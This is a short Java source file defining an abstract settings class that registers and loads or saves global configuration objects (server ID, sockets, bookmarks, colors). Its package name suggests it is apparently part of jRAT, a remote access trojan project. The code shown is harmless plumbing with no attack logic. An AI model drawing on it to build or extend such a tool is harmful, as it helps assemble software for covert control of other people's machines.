package pro.jrat.settings;

import java.io.File;
import java.util.ArrayList;
import java.util.List;


public abstract class AbstractSettings {

	private static final List<AbstractSettings> globalSettings = new ArrayList<AbstractSettings>();
	
	public static void loadAllGlobals() {
		if (globalSettings.size() == 0) {
			globalSettings.add(Settings.getGlobal());
			globalSettings.add(Statistics.getGlobal());
			globalSettings.add(ServerID.getGlobal());
			globalSettings.add(Sockets.getGlobal());
			globalSettings.add(FileBookmarks.getGlobal());
			globalSettings.add(Colors.getGlobal());
		}
		
		for (AbstractSettings setting : globalSettings) {
			try {
				setting.load();
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}
	
	public static void saveAllGlobals() {
		for (AbstractSettings setting : globalSettings) {
			try {
				setting.save();
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

	public abstract void save() throws Exception;

	public abstract void load() throws Exception;
	
	public abstract File getFile();

}
